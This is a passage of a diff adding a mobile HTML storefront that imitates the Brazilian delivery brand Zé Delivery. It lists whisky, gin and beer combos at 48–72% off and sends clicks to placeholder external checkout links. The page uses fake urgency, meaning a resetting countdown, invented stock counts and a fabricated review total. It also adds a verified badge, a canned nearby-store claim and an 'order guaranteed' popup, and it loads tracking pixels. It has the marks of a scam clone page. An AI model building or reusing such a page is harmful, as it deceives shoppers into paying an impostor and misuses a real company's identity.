@@ -1,0 +1,926 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Zé Delivery — Bebidas Geladas na sua porta!</title>
+  <meta name="description" content="Peça bebidas geladas com entrega rápida. Whisky, Gin, Cerveja, Energéticos e muito mais com até 67% OFF!">
+  <meta name="theme-color" content="#FFCC00">
+
+  <!-- UTMify Pixel -->
+  <script async="" src="js/fbevents.js"></script><script>
+    window.pixelId = "6a3dbedb33798c7e7b9c331d";
+
+    // Captura UTMs da URL e salva na sessão para não perder após navegação interna
+    (function() {
+      try {
+        var params = new URLSearchParams(window.location.search);
+        var utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','sck'];
+        utmKeys.forEach(function(k) {
+          if (params.get(k)) sessionStorage.setItem(k, params.get(k));
+        });
+      } catch(e) {}
+    })();
+
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script><script async="" defer="" src="js/pixel.js"></script>
+
+  <!-- Meta Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+    n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}
+    (window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '4470220059973229');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=4470220059973229&ev=PageView&noscript=1"/></noscript>
+
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+  <!-- Icons -->
+  <link rel="stylesheet" href="css/all.min.css">
+
+  <style>
+    /* ─── TOKENS ──────────────────────────────────────────────── */
+    :root {
+      --yellow:     #FFCC00;
+      --yellow-dk:  #E6B800;
+      --yellow-lt:  #FFF8D0;
+      --black:      #0D0D0D;
+      --gray-dk:    #333333;
+      --gray-md:    #6B6B6B;
+      --gray-lt:    #F5F5F5;
+      --border:     #E8E8E8;
+      --green:      #077C22;
+      --green-lt:   #E8F5EC;
+      --red:        #E00;
+      --red-lt:     #FFF0F0;
+      --white:      #FFFFFF;
+      --radius-sm:  8px;
+      --radius-md:  14px;
+      --radius-lg:  20px;
+      --shadow-sm:  0 2px 8px rgba(0,0,0,.08);
+      --shadow-md:  0 6px 24px rgba(0,0,0,.12);
+      --shadow-lg:  0 12px 40px rgba(0,0,0,.18);
+      --font:       'Nunito', sans-serif;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { font-size: 16px; scroll-behavior: smooth; }
+    body {
+      font-family: var(--font);
+      background: var(--gray-lt);
+      color: var(--black);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    img { display: block; max-width: 100%; }
+    button { cursor: pointer; border: none; background: none; font-family: inherit; }
+    a { text-decoration: none; color: inherit; }
+
+    .page {
+      max-width: 640px;
+      margin: 0 auto;
+      background: var(--white);
+      min-height: 100vh;
+      position: relative;
+    }
+
+    /* ─── BANNER TOPO ─────────────────────────────────────────── */
+    .banner-promo {
+      background: var(--black);
+      color: var(--yellow);
+      text-align: center;
+      padding: 8px 16px;
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: .4px;
+    }
+    .banner-promo span { color: var(--white); font-weight: 600; }
+
+    /* ─── HEADER ──────────────────────────────────────────────── */
+    .store-header { background: var(--white); position: relative; }
+    .cover-img { width: 100%; height: 140px; background: #1a1a1a; position: relative; }
+    .cover-img img { width: 100%; height: 100%; object-fit: cover; }
+
+    .logo-wrap {
+      position: absolute;
+      left: 50%; transform: translateX(-50%);
+      bottom: -36px; z-index: 10;
+      width: 80px; height: 80px;
+      border-radius: 50%;
+      border: 4px solid var(--white);
+      background: var(--yellow);
+      box-shadow: var(--shadow-md);
+      display: flex; align-items: center; justify-content: center;
+      overflow: hidden;
+    }
+    .logo-wrap img { width: 100%; height: 100%; object-fit: contain; border-radius: 50%; }
+
+    .store-info-card {
+      margin: 0 12px;
+      margin-top: 48px;
+      background: var(--white);
+      border-radius: var(--radius-lg);
+      padding: 16px 20px 14px;
+      box-shadow: var(--shadow-md);
+    }
+    .store-name {
+      font-size: 22px; font-weight: 900; color: var(--black);
+      display: flex; align-items: center; gap: 6px; justify-content: center;
+    }
+    .store-name .verified { color: #1877F2; font-size: 16px; }
+    .store-rating {
+      display: flex; align-items: center; justify-content: center;
+      gap: 6px; margin-top: 4px; font-size: 13px; color: var(--gray-dk);
+    }
+    .store-rating .stars { color: #F5A623; }
+    .store-rating .count { color: var(--gray-md); }
+    .store-divider { height: 1px; background: var(--border); margin: 10px 0; }
+    .store-meta {
+      display: flex; align-items: center; justify-content: center;
+      flex-wrap: wrap; gap: 10px; font-size: 12px; color: var(--gray-md);
+    }
+    .store-meta .pill {
+      display: flex; align-items: center; gap: 4px;
+      background: var(--gray-lt); padding: 4px 10px;
+      border-radius: 20px; font-weight: 700;
+    }
+    .store-meta .pill.green { background: var(--green-lt); color: var(--green); }
+    .store-meta .pill.yellow { background: var(--yellow-lt); color: #8B6900; }
+    .store-meta .pill i { font-size: 11px; }
+    .store-status-row {
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      margin-top: 8px; font-size: 12px; font-weight: 800; color: var(--green);
+    }
+    .dot-pulse {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: var(--green);
+      animation: pulse 1.4s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(7,124,34,.5); }
+      50%       { box-shadow: 0 0 0 5px rgba(7,124,34,0); }
+    }
+
+    .partner-badge {
+      margin: 10px 12px 0;
+      background: var(--yellow-lt);
+      border: 1.5px solid var(--yellow);
+      border-radius: var(--radius-md);
+      padding: 10px 14px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .partner-badge .badge-icon {
+      width: 40px; height: 40px; background: var(--yellow);
+      border-radius: 10px; display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; font-size: 20px;
+    }
+    .partner-badge .badge-text p:first-child {
+      font-size: 10px; font-weight: 900;
+      text-transform: uppercase; letter-spacing: .5px; color: var(--gray-md);
+    }
+    .partner-badge .badge-text p:last-child { font-size: 12px; font-weight: 700; color: var(--black); }
+
+    /* ─── COUNTDOWN ───────────────────────────────────────────── */
+    .countdown-bar {
+      margin: 10px 12px 0;
+      background: var(--black);
+      border-radius: var(--radius-md);
+      padding: 10px 16px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .countdown-bar .cd-label { font-size: 11px; font-weight: 800; color: rgba(255,255,255,.7); text-transform: uppercase; letter-spacing: .5px; }
+    .countdown-bar .cd-label span { display: block; color: var(--yellow); font-size: 13px; }
+    .countdown-digits { display: flex; align-items: center; gap: 4px; }
+    .cd-box {
+      background: var(--yellow); color: var(--black);
+      border-radius: 6px; padding: 4px 8px;
+      font-size: 18px; font-weight: 900; line-height: 1; min-width: 36px; text-align: center;
+    }
+    .cd-sep { color: var(--yellow); font-size: 16px; font-weight: 900; }
+    .cd-unit { font-size: 9px; font-weight: 700; color: rgba(255,255,255,.5); text-align: center; margin-top: 2px; }
+
+    /* ─── STICKY CATEGORIAS ───────────────────────────────────── */
+    .cat-nav { position: sticky; top: 0; z-index: 50; background: var(--white); border-bottom: 1.5px solid var(--border); }
+    .cat-nav-inner { display: flex; gap: 0; overflow-x: auto; scrollbar-width: none; padding: 0 12px; }
+    .cat-nav-inner::-webkit-scrollbar { display: none; }
+    .cat-btn { flex-shrink: 0; padding: 12px 14px; font-size: 13px; font-weight: 700; color: var(--gray-md); border-bottom: 2.5px solid transparent; white-space: nowrap; transition: color .2s, border-color .2s; }
+    .cat-btn.active { color: var(--black); border-bottom-color: var(--yellow); }
+
+    /* ─── PRODUTO SECTION ─────────────────────────────────────── */
+    .section { padding: 16px 0 4px; }
+    .section + .section { border-top: 6px solid var(--gray-lt); }
+    .section-head { padding: 0 16px 10px; }
+    .section-head h2 { font-size: 16px; font-weight: 800; color: var(--black); }
+    .section-head p { font-size: 12px; color: var(--gray-md); margin-top: 2px; }
+
+    /* ─── CARD PRODUTO ────────────────────────────────────────── */
+    .product-list { padding: 0 12px; display: flex; flex-direction: column; gap: 0; }
+    .product-card {
+      display: flex; align-items: flex-start; gap: 12px;
+      padding: 14px 4px; border-bottom: 1px solid var(--border);
+      cursor: pointer; transition: background .15s;
+      border-radius: 10px; position: relative;
+    }
+    .product-card:last-child { border-bottom: none; }
+    .product-card:active { background: var(--gray-lt); }
+    .product-card.flash {
+      border: 2px solid var(--green); border-radius: 12px;
+      padding: 12px; margin-bottom: 4px;
+      background: linear-gradient(135deg, #f0fff4 0%, #fff 100%);
+    }
+    .prod-info { flex: 1; min-width: 0; }
+    .prod-badges { display: flex; gap: 4px; flex-wrap: wrap; margin-bottom: 4px; }
+    .badge { font-size: 9px; font-weight: 900; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; letter-spacing: .3px; }
+    .badge.best   { background: var(--yellow-lt); color: #8B6900; }
+    .badge.flash-b{ background: var(--red); color: var(--white); }
+    .badge.new    { background: #E8F0FE; color: #1a73e8; }
+    .badge.off    { background: var(--green-lt); color: var(--green); }
+    .prod-name { font-size: 14px; font-weight: 700; color: var(--black); line-height: 1.3; margin-bottom: 3px; }
+    .prod-desc { font-size: 12px; color: var(--gray-md); line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    .prod-prices { display: flex; align-items: center; gap: 6px; margin-top: 6px; flex-wrap: wrap; }
+    .prod-price { font-size: 15px; font-weight: 900; color: var(--black); }
+    .prod-price-old { font-size: 12px; color: var(--gray-md); text-decoration: line-through; }
+    .prod-off-pct { font-size: 10px; font-weight: 900; background: var(--green-lt); color: var(--green); padding: 1px 5px; border-radius: 4px; }
+    .prod-stock { font-size: 10px; font-weight: 700; color: var(--red); margin-top: 4px; }
+    .prod-img-wrap { width: 90px; height: 90px; border-radius: 12px; background: var(--gray-lt); flex-shrink: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+    .prod-img-wrap img { width: 100%; height: 100%; object-fit: cover; }
+    .btn-add-card {
+      position: absolute; right: 0; bottom: 14px;
+      background: var(--black); color: var(--yellow);
+      border-radius: 20px; padding: 7px 13px;
+      display: flex; align-items: center; gap: 5px;
+      font-size: 11px; font-weight: 800; letter-spacing: .2px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.15);
+      transition: transform .15s, box-shadow .15s;
+    }
+    .btn-add-card i { font-size: 10px; }
+    .product-card:active .btn-add-card { transform: scale(.94); }
+
+    /* ─── AVALIAÇÕES ──────────────────────────────────────────── */
+    .reviews-section { padding: 16px 12px 12px; background: var(--white); }
+    .reviews-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+    .reviews-score { background: var(--yellow); border-radius: 10px; padding: 8px 12px; text-align: center; }
+    .reviews-score .score-num { font-size: 24px; font-weight: 900; }
+    .reviews-score .score-stars { color: #333; font-size: 10px; }
+    .reviews-meta { flex: 1; }
+    .reviews-meta p { font-size: 13px; font-weight: 700; color: var(--black); }
+    .reviews-meta small { font-size: 11px; color: var(--gray-md); }
+    .review-item { padding: 12px 0; border-bottom: 1px solid var(--border); display: flex; gap: 10px; align-items: flex-start; }
+    .review-item:last-child { border-bottom: none; }
+    .review-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--gray-lt); display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 800; color: var(--gray-md); flex-shrink: 0; overflow: hidden; }
+    .review-body { flex: 1; }
+    .review-name { font-size: 13px; font-weight: 800; color: var(--black); }
+    .review-stars { color: #F5A623; font-size: 11px; }
+    .review-date { font-size: 10px; color: var(--gray-md); margin-left: 4px; }
+    .review-text { font-size: 12px; color: #444; margin-top: 3px; line-height: 1.5; }
+    .review-img { width: 56px; height: 56px; border-radius: 8px; object-fit: cover; flex-shrink: 0; }
+
+    /* ─── FOOTER INFO ─────────────────────────────────────────── */
+    .footer-info { background: var(--black); color: rgba(255,255,255,.6); padding: 20px 16px; font-size: 11px; text-align: center; line-height: 1.7; }
+    .footer-info strong { color: var(--yellow); }
+
+    /* ─── LOCATION MODAL ──────────────────────────────────────── */
+    .loc-overlay { position: fixed; inset: 0; background: rgba(0,0,0,.6); z-index: 400; display: flex; align-items: center; justify-content: center; padding: 20px; }
+    .loc-modal { background: var(--white); border-radius: var(--radius-lg); padding: 28px 24px; width: 100%; max-width: 360px; text-align: center; box-shadow: var(--shadow-lg); animation: pop .3s cubic-bezier(.34,1.56,.64,1); }
+    @keyframes pop { from { transform: scale(.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .loc-modal .loc-icon { font-size: 40px; margin-bottom: 10px; }
+    .loc-modal h2 { font-size: 20px; font-weight: 900; margin-bottom: 6px; }
+    .loc-modal p { font-size: 13px; color: var(--gray-md); margin-bottom: 16px; }
+    .loc-city-box { background: var(--gray-lt); border-radius: 12px; padding: 10px 16px; margin-bottom: 16px; }
+    .loc-city-box strong { font-size: 16px; font-weight: 900; display: block; }
+    .loc-city-box small { font-size: 11px; color: var(--green); font-weight: 700; }
+    .btn-confirm-loc { width: 100%; background: var(--yellow); color: var(--black); padding: 14px; border-radius: var(--radius-md); font-size: 15px; font-weight: 900; margin-bottom: 8px; }
+    .btn-other-loc { width: 100%; background: var(--gray-lt); color: var(--gray-dk); padding: 12px; border-radius: var(--radius-md); font-size: 13px; font-weight: 700; }
+
+    @media (max-width: 400px) { .store-name { font-size: 19px; } }
+    /* ─── CONFIRMAÇÃO DE PEDIDO (ZÉ) ──────────────────────────── */
+    .ze-confirm-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,.55);
+      z-index: 600; display: flex; align-items: flex-end; justify-content: center;
+      opacity: 0; pointer-events: none; transition: opacity .25s;
+    }
+    .ze-confirm-overlay.show { opacity: 1; pointer-events: all; }
+    .ze-confirm-card {
+      background: var(--white);
+      width: 100%; max-width: 640px;
+      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
+      padding: 26px 24px 30px;
+      text-align: center;
+      transform: translateY(100%);
+      transition: transform .3s cubic-bezier(.32,.72,0,1);
+      box-shadow: var(--shadow-lg);
+    }
+    .ze-confirm-overlay.show .ze-confirm-card { transform: translateY(0); }
+    .ze-confirm-check {
+      width: 64px; height: 64px; border-radius: 50%;
+      background: var(--green); color: var(--white);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 30px; margin: 0 auto 14px;
+      animation: bounceIn2 .4s cubic-bezier(.34,1.56,.64,1);
+    }
+    @keyframes bounceIn2 { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .ze-confirm-card h3 { font-size: 18px; font-weight: 900; color: var(--black); margin-bottom: 6px; }
+    .ze-confirm-bubble {
+      background: var(--yellow-lt); border: 1.5px solid var(--yellow);
+      border-radius: var(--radius-md); padding: 12px 14px;
+      display: flex; align-items: flex-start; gap: 10px;
+      text-align: left; margin: 14px 0 18px;
+    }
+    .ze-confirm-bubble .ze-avatar {
+      width: 34px; height: 34px; border-radius: 50%;
+      background: var(--yellow); flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center; font-size: 17px;
+    }
+    .ze-confirm-bubble p { font-size: 13px; color: var(--gray-dk); line-height: 1.5; }
+    .ze-confirm-bubble strong { color: var(--black); }
+    .ze-confirm-redirect { font-size: 11px; color: var(--gray-md); display: flex; align-items: center; justify-content: center; gap: 6px; }
+    .ze-confirm-redirect .ze-spin { width: 12px; height: 12px; border: 2px solid var(--border); border-top-color: var(--green); border-radius: 50%; animation: spin .6s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+<!-- ── CONFIRMAÇÃO DE PEDIDO (ZÉ) ─────────────────────────────── -->
+<div class="ze-confirm-overlay" id="zeConfirmOverlay">
+  <div class="ze-confirm-card">
+    <div class="ze-confirm-check"><i class="fas fa-check"></i></div>
+    <h3>Pedido garantido! 🍺</h3>
+    <div class="ze-confirm-bubble">
+      <div class="ze-avatar">🧔</div>
+      <p><strong>Zé:</strong> Recebi seu pedido de <strong id="zeConfirmProduto">produto</strong>! Já vou preparar tudo certinho e sair pra entrega o quanto antes 🚀</p>
+    </div>
+    <div class="ze-confirm-redirect"><div class="ze-spin"></div> Te levando para finalizar...</div>
+  </div>
+</div>
+
+<!-- ── LOCATION MODAL ─────────────────────────────────────────── -->
+<div class="loc-overlay" id="locOverlay">
+  <div class="loc-modal">
+    <h2>Confirme sua localização</h2>
+    <p>Encontramos a loja mais próxima de você!</p>
+    <div class="loc-city-box">
+      <strong id="locCityName">Sua Cidade</strong>
+      <small>A <b>1,08 km</b> de você • Entrega em 15-45 min</small>
+    </div>
+    <button class="btn-confirm-loc" onclick="confirmLocation()">Sim, confirmar localização</button>
+    <button class="btn-other-loc" onclick="confirmLocation()">Não, escolher outro local</button>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- PAGE -->
+<div class="page">
+
+  <div class="banner-promo">
+    🔥 PROMOÇÃO RELÂMPAGO — <span>Só hoje! Até 67% OFF em bebidas selecionadas</span>
+  </div>
+
+  <header class="store-header">
+    <div class="cover-img">
+      <img src="images/hm.png" alt="Banner Zé Delivery">
+      <div class="logo-wrap" id="logoWrap">
+        <img src="images/zelogo.png" alt="Zé Delivery">
+      </div>
+    </div>
+
+    <div class="store-info-card">
+      <div class="store-name">
+        Zé Delivery
+        <i class="fas fa-circle-check verified"></i>
+      </div>
+      <div class="store-rating">
+        <span class="stars">★★★★★</span>
+        <strong>4,9</strong>
+        <span class="count">(71.368 avaliações em 2026)</span>
+      </div>
+      <div class="store-divider"></div>
+      <div class="store-meta">
+        <div class="pill green"><i class="fas fa-motorcycle"></i> 15–45 min</div>
+        <div class="pill green"><i class="fas fa-tag"></i> Entrega Grátis</div>
+        <div class="pill yellow"><i class="fas fa-coins"></i> Mín. R$ 21,49</div>
+        <div class="pill"><i class="fas fa-map-marker-alt"></i> <span id="locCity">Sua cidade</span></div>
+      </div>
+      <div class="store-status-row">
+        <div class="dot-pulse"></div>
+        ABERTO AGORA — Até 02:00
+        <i class="fas fa-shield-alt" style="color:var(--green);margin-left:6px;"></i>
+      </div>
+    </div>
+
+    <div class="partner-badge">
+      <div class="badge-icon">🏆</div>
+      <div class="badge-text">
+        <p>Atenção: Fique de olho nas promoções em app após essa compra</p>
+        <p>Promoção de primeiro pedido ativa! Descontos já aplicados.</p>
+      </div>
+    </div>
+
+    <div class="countdown-bar">
+      <div class="cd-label">
+        🔥 Promoção reinicia em
+        <span>Aproveita antes que acabem os estoques!</span>
+      </div>
+      <div>
+        <div class="countdown-digits">
+          <div><div class="cd-box" id="cdMin">22</div><div class="cd-unit">min</div></div>
+          <div class="cd-sep">:</div>
+          <div><div class="cd-box" id="cdSec">37</div><div class="cd-unit">seg</div></div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <nav class="cat-nav">
+    <div class="cat-nav-inner" id="catNav">
+      <button class="cat-btn active" data-target="sec-destaque">⚡ Destaques</button>
+      <button class="cat-btn" data-target="sec-whisky">Whisky</button>
+      <button class="cat-btn" data-target="sec-gin">Gin</button>
+      <button class="cat-btn" data-target="sec-cerveja">Cerveja</button>
+      <button class="cat-btn" data-target="sec-combos">Combos</button>
+      <button class="cat-btn" data-target="sec-energetico">Energéticos</button>
+      <button class="cat-btn" data-target="sec-avaliacoes">⭐ Avaliações</button>
+    </div>
+  </nav>
+
+  <main>
+
+    <!-- DESTAQUES -->
+    <section class="section" id="sec-destaque">
+      <div class="section-head">
+        <h2>🔥 Destaques — Mais Vendidos</h2>
+        <p>Os produtos mais pedidos das últimas horas</p>
+      </div>
+      <div class="product-list">
+        <a class="product-card flash" href="#LINK-jack" target="_blank" rel="noopener" data-produto="jack" data-nome="Combo Jack Daniel&#x27;s" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges">
+              <span class="badge flash-b">PROMO TOMA JACK!</span>
+              <span class="badge off">67% OFF</span>
+            </div>
+            <div class="prod-name">Combo Jack Daniel's</div>
+            <div class="prod-desc">Whisky Jack Daniel's + 4 Gelos Saborizados + 4 Energéticos para você e a galera!</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 76,47</span>
+              <span class="prod-price-old">R$ 299,90</span>
+              <span class="prod-off-pct">-67%</span>
+            </div>
+            <div class="prod-stock">🔥 Apenas <span id="estoqueJack">8</span> combos restantes!</div>
+          </div>
+          <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
+            <div class="prod-img-wrap">
+              <img src="images/jack.png" alt="Combo Jack Daniel's">
+            </div>
+          </div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+
+        <a class="product-card" href="#LINK-maromba_wh" target="_blank" rel="noopener" data-produto="maromba_wh" data-nome="Combo Mansão Maromba Whisky" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges">
+              <span class="badge best">🏆 Mais Vendido</span>
+              <span class="badge off">55% OFF</span>
+            </div>
+            <div class="prod-name">Combo Mansão Maromba Whisky</div>
+            <div class="prod-desc">3 garrafas de Whisky Sabor Energético 1L + 6 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 24,90</span>
+              <span class="prod-price-old">R$ 55,47</span>
+              <span class="prod-off-pct">-55%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/sabor.png" alt="Combo Mansão Maromba Whisky"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+
+        <a class="product-card" href="#LINK-maromba_gin" target="_blank" rel="noopener" data-produto="maromba_gin" data-nome="Combo Mansão Maromba Gin" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">55% OFF</span></div>
+            <div class="prod-name">Combo Mansão Maromba Gin</div>
+            <div class="prod-desc">3 garrafas de Gin Sabor Energético + 6 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 24,90</span>
+              <span class="prod-price-old">R$ 55,47</span>
+              <span class="prod-off-pct">-55%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/saborg.png" alt="Combo Mansão Maromba Gin"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+      </div>
+    </section>
+
+    <!-- WHISKY -->
+    <section class="section" id="sec-whisky">
+      <div class="section-head">
+        <h2> Whisky</h2>
+        <p>Seleção premium com os melhores descontos</p>
+      </div>
+      <div class="product-list">
+        <a class="product-card" href="#LINK-red_label" target="_blank" rel="noopener" data-produto="red_label" data-nome="Combo Red Label" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">54% OFF</span></div>
+            <div class="prod-name">Combo Red Label</div>
+            <div class="prod-desc">Johnnie Walker Red Label 1L + 2 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 69,90</span>
+              <span class="prod-price-old">R$ 152,00</span>
+              <span class="prod-off-pct">-54%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/red.png" alt="Combo Red Label"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+        <a class="product-card" href="#LINK-black_label" target="_blank" rel="noopener" data-produto="black_label" data-nome="Combo Black Label" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge best">🏆 Premium</span><span class="badge off">48% OFF</span></div>
+            <div class="prod-name">Combo Black Label</div>
+            <div class="prod-desc">Johnnie Walker Black Label 1L + 4 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 119,90</span>
+              <span class="prod-price-old">R$ 230,00</span>
+              <span class="prod-off-pct">-48%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/black.png" alt="Combo Black Label"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+      </div>
+    </section>
+
+    <!-- GIN -->
+    <section class="section" id="sec-gin">
+      <div class="section-head">
+        <h2> Gin</h2>
+        <p>Rótulos selecionados para os amantes de gin</p>
+      </div>
+      <div class="product-list">
+        <a class="product-card" href="#LINK-gin_beef" target="_blank" rel="noopener" data-produto="gin_beef" data-nome="Kit Gin Beefeater" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">60% OFF</span></div>
+            <div class="prod-name">Kit Gin Beefeater</div>
+            <div class="prod-desc">Beefeater London Dry Gin 750ml + tônica + limão</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 48,61</span>
+              <span class="prod-price-old">R$ 133,50</span>
+              <span class="prod-off-pct">-60%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/beef.png" alt="Kit Gin Beefeater"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+      </div>
+    </section>
+
+    <!-- CERVEJA -->
+    <section class="section" id="sec-cerveja">
+      <div class="section-head">
+        <h2> Cerveja</h2>
+        <p>Fardos gelados entregues até você</p>
+      </div>
+      <div class="product-list">
+        <a class="product-card" href="#LINK-heineken" target="_blank" rel="noopener" data-produto="heineken" data-nome="Fardo de Heineken" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge best">Popular</span></div>
+            <div class="prod-name">Fardo de Heineken</div>
+            <div class="prod-desc">Fardo com 12 unidades de 474ml</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 33,72</span>
+              <span class="prod-price-old">R$ 94,99</span>
+              <span class="prod-off-pct">-64%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/hein.png" alt="Fardo Heineken"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+        <a class="product-card" href="#LINK-budweiser" target="_blank" rel="noopener" data-produto="budweiser" data-nome="Fardo de Budweiser" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">72% OFF</span></div>
+            <div class="prod-name">Fardo de Budweiser</div>
+            <div class="prod-desc">Fardo com 12 unidades de 474ml</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 21,49</span>
+              <span class="prod-price-old">R$ 75,90</span>
+              <span class="prod-off-pct">-72%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/bud.png" alt="Fardo Budweiser"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+        <a class="product-card" href="#LINK-corona" target="_blank" rel="noopener" data-produto="corona" data-nome="Fardo de Corona" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"></div>
+            <div class="prod-name">Fardo de Corona</div>
+            <div class="prod-desc">Fardo com 24 unidades de 330ml</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 62,82</span>
+              <span class="prod-price-old">R$ 119,90</span>
+              <span class="prod-off-pct">-48%</span>
+            </div>
+            <div class="prod-stock">Estoque acabando!</div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/corona.png" alt="Fardo Corona"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+      </div>
+    </section>
+
+    <!-- COMBOS -->
+    <section class="section" id="sec-combos">
+      <div class="section-head">
+        <h2> Combos</h2>
+        <p>Monte seu kit ideal para a galera</p>
+      </div>
+      <div class="product-list">
+        <a class="product-card" href="#LINK-beats" target="_blank" rel="noopener" data-produto="beats" data-nome="Fardo de Beats Senses" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge off">53% OFF</span></div>
+            <div class="prod-name">Fardo de Beats Senses</div>
+            <div class="prod-desc">Fardo com 8 unidades de 269ml — sabores variados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 25,63</span>
+              <span class="prod-price-old">R$ 48,60</span>
+              <span class="prod-off-pct">-53%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/beats.png" alt="Fardo Beats Senses"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+        <a class="product-card" href="#LINK-combo_wh2" target="_blank" rel="noopener" data-produto="combo_wh2" data-nome="Combo Mansão Maromba Whisky" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge best">Popular</span><span class="badge off">55% OFF</span></div>
+            <div class="prod-name">Combo Mansão Maromba Whisky</div>
+            <div class="prod-desc">3 garrafas de Whisky Sabor Energético 1L + 6 gelos saborizados</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 24,90</span>
+              <span class="prod-price-old">R$ 55,47</span>
+              <span class="prod-off-pct">-55%</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/sabor.png" alt="Combo Maromba Whisky"></div>
